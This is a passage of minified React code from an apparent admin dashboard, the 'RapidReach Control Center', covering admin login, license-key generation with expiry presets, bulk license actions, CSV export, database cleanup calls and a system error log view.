-bottom-6 sm:-bottom-7 left-0 flex items-center gap-1 text-red-300 text-xs font-jetbrains",children:[a.jsx(Pi,{className:"w-3 h-3 flex-shrink-0"}),a.jsx("span",{className:"break-words",children:l})]})]})}),a.jsx("div",{className:"pt-2",children:a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsx(W,{type:"submit",disabled:i||!e||!n,className:"relative z-10 w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-jetbrains font-bold uppercase tracking-wider border-0 text-xs sm:text-base py-3 min-h-[48px] touch-manipulation",children:a.jsxs("div",{className:"flex items-center gap-1 sm:gap-2",children:[a.jsx(Ge,{className:"w-3 h-3 sm:w-4 sm:h-4"}),i?"AUTHENTICATING...":"AUTHORIZE ACCESS"]})})]})})]}),a.jsx("div",{className:"mt-4 sm:mt-6 pt-4 sm:pt-6 border-t border-cyan-400/30 relative z-10",children:a.jsx("p",{className:"text-xs sm:text-sm text-cyan-300/70 text-center font-jetbrains leading-relaxed px-2",children:"PHANTOM ENGINE COMMAND PROTOCOL"})})]})})]})},xC=({children:t})=>{const[e,r]=p.useState(!1),[n,s]=p.useState(!0),[i,o]=p.useState(""),[l,c]=p.useState(void 0);p.useEffect(()=>{d()},[]);const d=async()=>{const m=localStorage.getItem("admin_session_token"),g=localStorage.getItem("admin_username"),v=localStorage.getItem("admin_expires_at");if(!m||!v){s(!1);return}if(new Date(v)<=new Date){f();return}try{const{data:w,error:y}=await $.rpc("validate_admin_session",{session_token_input:m});if(y)throw y;const x=w;x!=null&&x.valid?(r(!0),o(g||x.username),await u()):f()}catch(w){console.error("Session validation error:",w),f()}finally{s(!1)}},u=async()=>{try{const{data:m,error:g,count:v}=await $.from("license_keys").select("*",{count:"exact"}).order("created_at",{ascending:!1}).range(0,19);if(g)throw g;const{data:w,error:y,count:x}=await $.from("system_error_logs").select("*",{count:"exact"}).order("created_at",{ascending:!1}).range(0,19);if(y)throw y;c({licenseKeys:m||[],systemErrors:w||[],totalCounts:{licenses:v||0,errors:x||0}})}catch(m){console.error("Error loading admin data:",m)}},h=async(m,g)=>{r(!0),o(g),await u()},f=async()=>{const m=localStorage.getItem("admin_session_token");if(m)try{await $.rpc("logout_admin",{session_token_input:m})}catch(g){console.error("Logout error:",g)}localStorage.removeItem("admin_session_token"),localStorage.removeItem("admin_username"),localStorage.removeItem("admin_expires_at"),r(!1),o(""),be.success("Logged out successfully")};return n?a.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 bg-[length:400%_400%] animate-gradient-flow flex items-center justify-center relative overflow-hidden",children:[a.jsxs("div",{className:"absolute inset-0 pointer-events-none opacity-30",children:[a.jsx("div",{className:"absolute top-20 left-10 w-16 h-16 bg-cyan-400/10 backdrop-blur-sm rounded-lg animate-float-1"}),a.jsx("div",{className:"absolute top-40 right-16 w-12 h-12 bg-blue-400/10 backdrop-blur-sm rounded-full animate-float-2"})]}),a.jsxs("div",{className:"text-center space-y-4 relative z-10",children:[a.jsxs("div",{className:"mx-auto relative w-16 h-16 mb-4",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/40 to-blue-500/40 rounded-xl animate-pulse blur-md"}),a.jsx("div",{className:"relative z-10 w-full h-full bg-gradient-to-br from-cyan-400/30 to-blue-500/30 rounded-xl border border-cyan-400/40 backdrop-blur-sm flex items-center justify-center",children:a.jsx(Ge,{className:"w-8 h-8 text-cyan-300 animate-pulse"})})]}),a.jsx("div",{className:"text-cyan-300/80 font-jetbrains tracking-wide uppercase inline-flex",children:"INITIALIZING RAPIDREACH CONTROL CENTER...".split("").map((m,g)=>a.jsx("span",{className:"animate-wave-letter",style:{animationDelay:`${g*80}ms`},children:m===" "?"":m},g))})]})]}):e?a.jsx("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 relative",children:a.jsx("div",{className:"p-6",children:t(l,f)})}):a.jsx(gC,{onLoginSuccess:h})},Y0=[{value:"1_day",label:"1 Day"},{value:"2_days",label:"2 Days"},{value:"5_days",label:"5 Days"},{value:"1_month",label:"1 Month (30 days)"},{value:"1_year",label:"1 Year (365 days)"},{value:"lifetime",label:"Lifetime"}],yC=({initialData:t,onLogout:e})=>{const[r,n]=p.useState((t==null?void 0:t.licenseKeys)||[]),[s,i]=p.useState((t==null?void 0:t.systemErrors)||[]),[o,l]=p.useState(!t),[c,d]=p.useState(!1),{toast:u}=Ln(),[h,f]=p.useState(1),[m,g]=p.useState("1_month"),[v,w]=p.useState(""),[y,x]=p.useState(!1),[b,j]=p.useState({licenses:1,errors:1}),[_]=p.useState(20),[N,S]=p.useState((t==null?void 0:t.totalCounts)||{licenses:0,errors:0}),[k,C]=p.useState([]),[T,M]=p.useState([]),A=p.useRef(null),R=p.useRef(null);p.useEffect(()=>{if(A.current){const E=k.length>0&&k.length<r.length;A.current.indeterminate=E}},[k,r]),p.useEffect(()=>{if(R.current){const E=T.length>0&&T.length<s.length;R.current.indeterminate=E}},[T,s]),p.useEffect(()=>{C(E=>E.filter(U=>r.some(O=>O.id===U)))},[r]),p.useEffect(()=>{M(E=>E.filter(U=>s.some(O=>O.id===U)))},[s]),p.useEffect(()=>{t||I(!0);const E=setInterval(P,5*60*1e3),U=setInterval(()=>I(!1),3*60*1e3);return()=>{clearInterval(E),clearInterval(U)}},[t]);const I=async(E=!1)=>{try{E&&l(!0);const U=$.from("license_keys").select("*",{count:"exact"}).order("created_at",{ascending:!1}),{data:O,error:V,count:se}=await U.range((b.licenses-1)*_,b.licenses*_-1);if(V)throw V;n(O||[]),S(_s=>({..._s,licenses:se||0}));const St=$.from("system_error_logs").select("*",{count:"exact"}).order("created_at",{ascending:!1}),{data:Be,error:On,count:vc}=await St.range((b.errors-1)*_,b.errors*_-1);if(On)throw On;i(Be||[]),S(_s=>({..._s,errors:vc||0}))}catch(U){console.error("Error fetching data:",U),u({title:"Error",description:"Failed to load data. Please try again.",variant:"destructive"})}finally{E&&l(!1)}},J=async()=>{try{x(!0);const E=[],U=[];for(let O=0;O<h;O++){const V=h===1&&v?v:null,{data:se,error:St}=await $.rpc("generate_license_with_preset",{preset:m,user_email_input:V});if(St)throw St;if(!(se!=null&&se.success))throw new Error(se==null?void 0:se.error);E.push(se),U.push(se.license_key)}if(U.length===1)await navigator.clipboard.writeText(U[0]),u({title:"License Generated & Copied!",description:"License key copied to clipboard automatically"});else{const O=U.join(`
`);await navigator.clipboard.writeText(O),u({title:"Licenses Generated & Copied!",description:`All ${h} license keys copied to clipboard`})}f(1),g("1_month"),w(""),I()}catch(E){console.error("Error generating keys:",E),u({title:"Error",description:E.message||"Failed to generate license keys. Please try again.",variant:"destructive"})}finally{x(!1)}},K=async(E,U)=>{try{const O=U==="active"?"paused":"active";console.log("Toggling license status:",{id:E,currentStatus:U,newStatus:O});const{data:V,error:se}=await $.rpc("toggle_license_status",{license_id:E,new_status:O});if(console.log("Toggle response:",{data:V,error:se}),se)throw se;if(!(V!=null&&V.success))throw new Error(V==null?void 0:V.error);u({title:"Status Updated",description:`License ${O==="active"?"activated":"paused"}`}),I()}catch(O){console.error("Error updating status:",O),u({title:"Error",description:"Failed to update license status",variant:"destructive"})}},ne=async E=>{try{const{error:U}=await $.from("license_keys").delete().eq("id",E);if(U)throw U;u({title:"Deleted",description:"License deleted successfully"}),I()}catch(U){console.error("Error deleting license:",U),u({title:"Error",description:"Failed to delete license",variant:"destructive"})}},P=async()=>{try{const{data:E,error:U}=await $.rpc("cleanup_expired_licenses");if(U)throw U;E>0&&(u({title:"Cleanup Complete",description:`Removed ${E} expired license(s)`}),I())}catch(E){console.error("Error during cleanup:",E)}},z=async()=>{try{l(!0);let E=0,U=0;try{const{data:O,error:V}=await $.rpc("cleanup_expired_licenses");!V&&typeof O=="number"&&(E+=O,U++)}catch(O){console.error("Failed to cleanup expired licenses:",O)}try{const{data:O,error:V}=await $.rpc("cleanup_user_sessions",{days_old:7});if(!V&&O&&typeof O=="object"){const se=O;se.deleted_sessions&&(E+=se.deleted_sessions),U++}}catch(O){console.error("Failed to cleanup user sessions:",O)}try{const{data:O,error:V}=await $.rpc("cleanup_visit_stats",{days_old:30});if(!V&&O&&typeof O=="object"){const se=O;se.deleted_stats&&(E+=se.deleted_stats),U++}}catch(O){console.error("Failed to cleanup visit stats:",O)}try{const{data:O,error:V}=await $.rpc("cleanup_orphaned_sessions");if(!V&&O&&typeof O=="object"){const se=O;se.deleted_sessions&&(E+=se.deleted_sessions),U++}}catch(O){console.error("Failed to cleanup orphaned sessions:",O)}try{await $.rpc("auto_cleanup_expired_data"),U++}catch(O){console.error("Failed to run auto cleanup:",O)}u({title:"Database Purge Complete",description:`Successfully executed ${U} cleanup operations, cleaned ${E} records`}),I()}catch(E){console.error("Error during comprehensive cleanup:",E),u({title:"Cleanup Error",description:"Some cleanup operations failed. Check console for details.",variant:"destructive"})}finally{l(!1)}},Q=async()=>{try{const{data:E,error:U}=await $.from("license_keys").select("id").or("status.eq.paused,status.eq.expired,is_active.eq.false");if(U)throw U;if(E&&E.length>0){const O=E.map(se=>se.id),{error:V}=await $.from("user_sessions").delete().in("license_key_id",O);if(V)throw V;u({title:"Inactive License Cleanup",description:`Cleaned up data for ${E.length} inactive licenses`}),I()}else u({title:"No Cleanup Needed",description:"No inactive license data found to clean"})}catch(E){console.error("Error cleaning inactive license data:",E),u({title:"Cleanup Error",description:"Failed to clean inactive license data",variant:"destructive"})}},H=E=>{navigator.clipboard.writeText(E),u({title:"Copied",description:"Copied to clipboard"})},te=(E,U,O)=>!U||E==="paused"?"bg-yellow-500/20 text-yellow-300 border-yellow-400/30":E==="expired"||O&&new Date(O)<new Date?"bg-red-500/20 text-red-300 border-red-400/30":"bg-emerald-500/20 text-emerald-300 border-emerald-400/30",ie=(E,U,O)=>!U||E==="paused"?"Paused":E==="expired"||O&&new Date(O)<new Date?"Expired":"Active",_e=async E=>{try{const{error:U}=await $.rpc("resolve_system_error",{error_id_input:E,resolved_by_input:"Admin"});if(U)throw U;i(O=>O.map(V=>V.id===E?{...V,resolved_status:!0,resolved_by:"Admin",resolved_at:new Date().toISOString()}:V)),u({title:"Error Resolved",description:"System error marked as resolved"})}catch(U){console.error("Error resolving system error:",U),u({title:"Error",description:"Failed to resolve system error",variant:"destructive"})}},Ye=E=>{switch(E){case"critical":return"bg-red-500/30 text-red-200 border-red-400/40";case"error":return"bg-red-500/20 text-red-300 border-red-400/30";case"warning":return"bg-yellow-500/20 text-yellow-300 border-yellow-400/30";case"info":return"bg-blue-500/20 text-blue-300 border-blue-400/30";default:return"bg-gray-500/20 text-gray-300 border-gray-400/30"}},ge=E=>{switch(E){case"telegram_config":return"bg-purple-500/20 text-purple-300 border-purple-400/30";case"telegram_send":return"bg-green-500/20 text-green-300 border-green-400/30";case"encryption":return"bg-orange-500/20 text-orange-300 border-orange-400/30";case"decryption":return"bg-orange-500/20 text-orange-300 border-orange-400/30";default:return"bg-cyan-500/20 text-cyan-300 border-cyan-400/30"}},Je=async()=>{if(k.length!==0)try{const{data:E,error:U}=await $.rpc("bulk_delete_licenses",{license_ids:k});if(U)throw U;const O=E;u({title:"Bulk Delete Complete",description:`Deleted ${O.deleted_count} of ${O.total_requested} licenses`}),C([]),I()}catch(E){console.error("Error bulk deleting licenses:",E),u({title:"Error",description:"Failed to delete licenses",variant:"destructive"})}},$t=async()=>{if(k.length===0)return;const E=r.filter(V=>k.includes(V.id)),O=E.filter(V=>V.status==="active").length>E.length/2?"paused":"active";try{const{data:V,error:se}=await $.rpc("bulk_toggle_license_status",{license_ids:k,new_status:O});if(se)throw se;u({title:"Bulk Status Update Complete",description:`Updated ${V.updated_count} licenses to ${O}`}),C([]),I()}catch(V){console.error("Error bulk updating license status:",V),u({title:"Error",description:"Failed to update license status",variant:"destructive"})}},Ut=async()=>{if(k.length===0)return;const O=["License Key,User Email,Status,Created Date,Expires Date,Expiry Preset",...r.filter(Be=>k.includes(Be.id)).map(Be=>({license_key:Be.license_key,user_email:Be.assigned_user_email||"Unassigned",status:Be.status,created_at:Be.created_at,expires_at:Be.expires_at||"Never",expiry_preset:Be.expiry_preset||"Custom"})).map(Be=>`"${Be.license_key}","${Be.user_email}","${Be.status}","${Be.created_at}","${Be.expires_at}","${Be.expiry_preset}"`)].join(`
`),V=new Blob([O],{type:"text/csv"}),se=URL.createObjectURL(V),St=document.createElement("a");St.href=se,St.download=`licenses_export_${new Date().toISOString().split("T")[0]}.csv`,document.body.appendChild(St),St.click(),document.body.removeChild(St),URL.revokeObjectURL(se),u({title:"Export Complete",description:`Exported ${k.length} licenses to CSV`}),C([])},B=async()=>{if(T.length!==0)try{const{data:E,error:U}=await $.rpc("bulk_resolve_errors",{error_ids:T,resolved_by_input:"Admin"});if(U)throw U;const O=E;u({title:"Bulk Resolve Complete",description:`Resolved ${O.resolved_count} of ${O.total_requested} errors`}),M([]),I()}catch(E){console.error("Error bulk resolving errors:",E),u({title:"Error",description:"Failed to resolve errors",variant:"destructive"})}},Y=async()=>{if(T.length!==0)try{const{data:E,error:U}=await $.rpc("bulk_delete_errors",{error_ids:T});if(U)throw U;u({title:"Bulk Delete Complete",description:`Deleted ${E.deleted_count} resolved errors`}),M([]),I()}catch(E){console.error("Error bulk deleting errors:",E),u({title:"Error",description:"Failed to delete errors",variant:"destructive"})}},ee=E=>{C(E?r.map(U=>U.id):[])},pe=(E,U)=>{C(O=>U?O.includes(E)?O:[...O,E]:O.filter(V=>V!==E))},ye=E=>{M(E?s.map(U=>U.id):[])},he=(E,U)=>{M(O=>U?O.includes(E)?O:[...O,E]:O.filter(V=>V!==E))};return a.jsxs("div",{className:"min-h-screen w-full fixed inset-0 bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 overflow-y-auto overflow-x-hidden relative",children:[a.jsxs("div",{className:"absolute inset-0 pointer-events-none overflow-hidden",children:[a.jsx("div",{className:"absolute top-20 left-10 w-12 h-12 bg-cyan-400/5 backdrop-blur-sm rounded-lg opacity-60"}),a.jsx("div",{className:"absolute top-40 right-16 w-8 h-8 bg-blue-400/5 backdrop-blur-sm rounded-full opacity-60"}),a.jsx("div",{className:"absolute bottom-32 left-1/4 w-16 h-6 bg-purple-400/5 backdrop-blur-sm transform rotate-45 opacity-60"}),a.jsx("div",{className:"absolute bottom-20 right-1/3 w-10 h-10 bg-teal-400/5 backdrop-blur-sm transform rotate-12 opacity-60"}),a.jsx("div",{className:"absolute top-1/3 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/20 to-transparent"}),a.jsx("div",{className:"absolute inset-0 opacity-[0.02] bg-[linear-gradient(90deg,transparent_24px,rgba(59,130,246,0.3)_25px,rgba(59,130,246,0.3)_26px,transparent_27px,transparent_49px,rgba(59,130,246,0.3)_50px,rgba(59,130,246,0.3)_51px,transparent_52px),linear-gradient(rgba(59,130,246,0.3)_24px,transparent_25px,transparent_26px,rgba(59,130,246,0.3)_27px,rgba(59,130,246,0.3)_49px,transparent_50px,transparent_51px,rgba(59,130,246,0.3)_52px)] bg-[size:52px_52px]"})]}),a.jsxs("div",{className:"max-w-7xl mx-auto p-2 sm:p-4 lg:p-6 relative z-10 min-h-full",children:[a.jsxs("div",{className:"flex flex-row items-start gap-2 sm:gap-4 lg:gap-6 mb-4 sm:mb-6 lg:mb-8",children:[a.jsxs("div",{className:"relative flex-shrink-0",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/30 to-blue-500/30 rounded-xl blur-sm"}),a.jsx("div",{className:"relative z-10 p-2 sm:p-3 lg:p-4 bg-gradient-to-br from-cyan-400/20 to-blue-500/20 rounded-xl border border-cyan-400/30 backdrop-blur-sm",children:a.jsx(Ge,{className:"w-6 h-6 sm:w-8 sm:h-8 lg:w-10 lg:h-10 text-cyan-300"})})]}),a.jsxs("div",{className:"flex-1 min-w-0 hidden md:block",children:[a.jsx("h1",{className:"text-base sm:text-lg md:text-2xl lg:text-3xl xl:text-4xl font-bold bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains uppercase tracking-wider mb-0.5 sm:mb-1 lg:mb-2 leading-tight break-words",children:"RAPIDREACH CONTROL CENTER"}),a.jsxs("p",{className:"text-xs sm:text-sm lg:text-base text-cyan-300/80 font-jetbrains tracking-wide leading-tight",children:[a.jsx("span",{className:"hidden sm:inline",children:"SYSTEM MANAGEMENT  AUTOMATED CLEANUP  ENHANCED SECURITY"}),a.jsx("span",{className:"sm:hidden",children:"SYSTEM MGMT"})]})]}),e&&a.jsxs(W,{onClick:e,variant:"outline",size:"sm",className:"ml-auto bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains text-xs sm:text-sm px-2 sm:px-3 py-1 sm:py-2 h-8 sm:h-9",children:[a.jsx(Qj,{className:"w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2"}),a.jsx("span",{className:"hidden sm:inline",children:"Disconnect"})]})]}),a.jsxs(wf,{defaultValue:"generate",className:"space-y-4 sm:space-y-6 lg:space-y-8",children:[a.jsx("div",{className:"relative",children:a.jsxs(yc,{className:"w-full justify-start",children:[a.jsxs(ar,{value:"generate",className:"flex-shrink-0",children:[a.jsx(Zj,{className:"w-4 h-4 sm:w-4 sm:h-4 mr-0 sm:mr-2"}),a.jsx("span",{className:"hidden sm:inline",children:"LICENSE"})]}),a.jsxs(ar,{value:"keys",className:"flex-shrink-0",children:[a.jsx(ey,{className:"w-4 h-4 sm:w-4 sm:h-4 mr-0 sm:mr-2"}),a.jsxs("span",{className:"hidden sm:inline",children:["USERS (",N.licenses,")"]})]}),a.jsxs(ar,{value:"errors",className:"flex-shrink-0",children:[a.jsx(ct,{className:"w-4 h-4 sm:w-4 sm:h-4 mr-0 sm:mr-2"}),a.jsxs("span",{className:"hidden sm:inline",children:["ERRORS (",N.errors,")"]})]}),a.jsxs(ar,{value:"health",className:"flex-shrink-0",children:[a.jsx(Nn,{className:"w-4 h-4 sm:w-4 sm:h-4 mr-0 sm:mr-2"}),a.jsx("span",{className:"hidden sm:inline",children:"MONITORING"})]}),a.jsxs(ar,{value:"performance",className:"flex-shrink-0",children:[a.jsx(Ge,{className:"w-4 h-4 sm:w-4 sm:h-4 mr-0 sm:mr-2"}),a.jsx("span",{className:"hidden sm:inline",children:"PERFORMANCE"})]}),a.jsxs(ar,{value:"files",className:"flex-shrink-0",children:[a.jsx(Ai,{className:"w-4 h-4 sm:w-4 sm:h-4 mr-0 sm:mr-2"}),a.jsx("span",{className:"hidden sm:inline",children:"FILES"})]})]})}),a.jsx(ir,{value:"generate",children:a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsxs(fe,{className:"relative z-10",children:[a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"LICENSE GENERATOR"}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"GENERATE LICENSE KEYS WITH EXPIRY SETTINGS"})]}),a.jsxs(X,{className:"relative z-10 space-y-6",children:[a.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6",children:[a.jsxs("div",{className:"space-y-2",children:[a.jsx(Ht,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-sm",children:"KEY QUANTITY"}),a.jsx(Ze,{type:"number",value:h,onChange:E=>f(Math.max(1,parseInt(E.target.value)||1)),min:"1",max:"50",className:"bg-slate-700/80 border-cyan-400/30 text-cyan-200 font-jetbrains backdrop-blur-sm focus:border-cyan-300/60"})]}),a.jsxs("div",{className:"space-y-2",children:[a.jsx(Ht,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-sm",children:"LICENSE"}),a.jsx("select",{value:m,onChange:E=>g(E.target.value),className:"bg-slate-700/80 border border-cyan-400/30 text-cyan-200 font-jetbrains rounded-md px-3 py-2 w-full focus:outline-none focus:ring-2 focus:ring-cyan-500/50 backdrop-blur-sm",children:Y0.map(E=>a.jsx("option",{value:E.value,className:"bg-slate-800",children:E.label},E.value))})]}),a.jsxs("div",{className:"space-y-2",children:[a.jsx(Ht,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-sm",children:"USERNAME"}),a.jsx(Ze,{type:"text",value:v,onChange:E=>w(E.target.value),placeholder:"ASSIGN USER",className:"bg-slate-700/80 border-cyan-400/30 text-cyan-200 font-jetbrains backdrop-blur-sm focus:border-cyan-300/60 disabled:opacity-50",disabled:h>1}),h>1&&a.jsx("p",{className:"text-xs text-cyan-300/60 font-jetbrains mt-1",children:"USER ASSIGNMENT REQUIRES SINGLE KEY MODE"})]})]}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 rounded-xl opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsx(W,{onClick:J,disabled:y,className:"relative z-10 w-full h-12 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-jetbrains font-bold uppercase tracking-wider border-0 shadow-lg",children:y?" FORGING KEYS...":` FORGE ${h} KEY${h>1?"S":""}`})]})]})]})}),a.jsx(ir,{value:"keys",children:a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider flex items-center justify-between",children:["USER LICENSE DATABASE",a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{variant:"outline",size:"sm",onClick:()=>d(!c),className:"relative z-10 bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm",children:[c?a.jsx(vl,{className:"w-4 h-4"}):a.jsx(kn,{className:"w-4 h-4"}),a.jsx("span",{className:"ml-2 hidden sm:inline",children:c?"HIDE":"REVEAL"})]})]})]})}),a.jsxs(X,{className:"relative z-10",children:[k.length>0&&a.jsx("div",{className:"mb-6",children:a.jsx(K0,{selectedItems:k,onClearSelection:()=>C([]),onBulkDelete:Je,onBulkToggleStatus:$t,onBulkExport:Ut,itemType:"licenses"})}),a.jsxs(nC,{children:[a.jsx(sC,{children:a.jsxs("tr",{className:"border-b border-cyan-400/30",children:[a.jsx(zn,{priority:"high",className:"w-12",children:a.jsx("input",{ref:A,type:"checkbox",checked:k.length===r.length&&r.length>0,onChange:E=>ee(E.target.checked),className:"rounded border-cyan-400/30 bg-slate-700/80 text-cyan-500 focus:ring-cyan-500/50 touch-target"})}),a.jsx(zn,{priority:"high",children:"LICENSE KEY"}),a.jsx(zn,{priority:"medium",children:"USERNAME"}),a.jsx(zn,{priority:"high",children:"STATUS"}),a.jsx(zn,{priority:"low",children:"USAGE"}),a.jsx(zn,{priority:"low",children:"EXPIRES"}),a.jsx(zn,{priority:"high",children:"CONTROLS"})]})}),a.jsx(aC,{children:r.map(E=>{var U;return a.jsxs(iC,{className:`${k.includes(E.id)?"bg-cyan-500/10":""}`,mobileLayout:a.jsxs("div",{className:"p-4 space-y-5 hover:bg-slate-800/40 transition-colors duration-200 rounded-lg border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-4",children:[a.jsx("input",{type:"checkbox",checked:k.includes(E.id),onChange:O=>{O.stopPropagation(),pe(E.id,O.target.checked)},className:"rounded border-cyan-400/30 bg-slate-700/80 text-cyan-500 focus:ring-cyan-500/50 touch-target h-5 w-5"}),a.jsx("span",{className:`px-3 py-1.5 rounded-md text-xs font-jetbrains font-medium uppercase tracking-wider ${te(E.status,E.is_active,E.expires_at)} border backdrop-blur-sm`,children:ie(E.status,E.is_active,E.expires_at)})]}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:"text-xs text-cyan-400 uppercase font-jetbrains mb-2 tracking-wider",children:"LICENSE KEY"}),a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx("code",{className:"bg-slate-700/70 px-3 py-2.5 rounded border border-cyan-400/30 backdrop-blur-sm text-xs break-all flex-1",children:c?E.license_key:""}),a.jsx(W,{variant:"ghost",size:"sm",onClick:()=>H(E.license_key),className:"p-3 h-12 w-12 hover:bg-cyan-500/20 text-cyan-400 touch-target flex-shrink-0 rounded-lg",title:"Copy license key",children:a.jsx(xl,{className:"w-4 h-4"})})]})]}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:"text-xs text-cyan-400 uppercase font-jetbrains mb-2 tracking-wider",children:"USERNAME"}),a.jsx("div",{className:"text-cyan-300 font-jetbrains text-sm min-h-[1.25rem]",children:E.assigned_user_email||a.jsx("span",{className:"text-slate-400 italic",children:"UNASSIGNED"})})]}),a.jsxs("div",{className:"grid grid-cols-2 gap-6",children:[a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:"text-xs text-cyan-400 uppercase font-jetbrains tracking-wider",children:"USAGE"}),a.jsxs("div",{className:"text-cyan-300 font-jetbrains font-bold text-sm min-h-[1.25rem]",children:[E.password_generation_count,"/",E.max_password_generations," USES"]})]}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:"text-xs text-cyan-400 uppercase font-jetbrains tracking-wider",children:"EXPIRES"}),a.jsx("div",{className:"text-cyan-300 font-jetbrains text-sm min-h-[1.25rem]",children:E.expires_at?new Date(E.expires_at).toLocaleDateString():"ETERNAL"})]})]}),a.jsxs("div",{className:"space-y-4 pt-2 border-t border-cyan-400/20",children:[a.jsx("div",{className:"text-xs text-cyan-400 uppercase font-jetbrains tracking-wider",children:"CONTROLS"}),a.jsxs("div",{className:"flex gap-3",children:[a.jsxs(W,{variant:"outline",size:"sm",onClick:()=>K(E.id,E.status),className:"bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 backdrop-blur-sm touch-target flex-1 h-11 min-w-0",disabled:E.status==="expired",title:E.status==="active"?"Pause license":"Activate license",children:[E.status==="active"?a.jsx(cu,{className:"w-4 h-4 mr-2"}):a.jsx(Vm,{className:"w-4 h-4 mr-2"}),a.jsx("span",{className:"text-xs font-semibold",children:E.status==="active"?"PAUSE":"ACTIVATE"})]}),a.jsx(W,{variant:"outline",size:"sm",onClick:()=>ne(E.id),className:"bg-red-600/30 border-red-400/40 text-red-300 hover:bg-red-600/50 hover:border-red-300/60 backdrop-blur-sm touch-target px-4 h-11",title:"Delete license",children:a.jsx(ta,{className:"w-4 h-4"})})]})]})]}),children:[a.jsx(Dn,{priority:"high",children:a.jsx("input",{type:"checkbox",checked:k.includes(E.id),onChange:O=>{O.stopPropagation(),pe(E.id,O.target.checked)},className:"rounded border-cyan-400/30 bg-slate-700/80 text-cyan-500 focus:ring-cyan-500/50"})}),a.jsx(Dn,{priority:"high",label:"License Key",className:"text-cyan-300 font-jetbrains",children:a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx("code",{className:"bg-slate-700/70 px-3 py-2 rounded border border-cyan-400/30 backdrop-blur-sm text-sm",children:c?E.license_key:""}),a.jsx(W,{variant:"ghost",size:"sm",onClick:()=>H(E.license_key),className:"p-2 h-9 w-9 hover:bg-cyan-500/20 text-cyan-400 rounded-lg",title:"Copy license key",children:a.jsx(xl,{className:"w-4 h-4"})})]})}),a.jsx(Dn,{priority:"medium",label:"Username",className:"text-cyan-300 font-jetbrains",children:E.assigned_user_email||a.jsx("span",{className:"text-slate-400 italic",children:"UNASSIGNED"})}),a.jsx(Dn,{priority:"high",label:"Status",children:a.jsxs("div",{className:"space-y-2",children:[a.jsx("span",{className:`px-3 py-1.5 rounded-md text-xs font-jetbrains font-medium uppercase tracking-wider ${te(E.status,E.is_active,E.expires_at)} border backdrop-blur-sm`,children:ie(E.status,E.is_active,E.expires_at)}),E.expiry_preset&&a.jsx("div",{className:"text-xs text-cyan-400/60 font-jetbrains uppercase tracking-wide",children:(U=Y0.find(O=>O.value===E.expiry_preset))==null?void 0:U.label})]})}),a.jsxs(Dn,{priority:"low",label:"Usage",className:"text-cyan-300 font-jetbrains font-bold",children:[E.password_generation_count,"/",E.max_password_generations," USES"]}),a.jsx(Dn,{priority:"low",label:"Expires",className:"text-cyan-300 font-jetbrains",children:E.expires_at?new Date(E.expires_at).toLocaleDateString():"ETERNAL"}),a.jsx(Dn,{priority:"high",label:"Controls",children:a.jsxs("div",{className:"flex 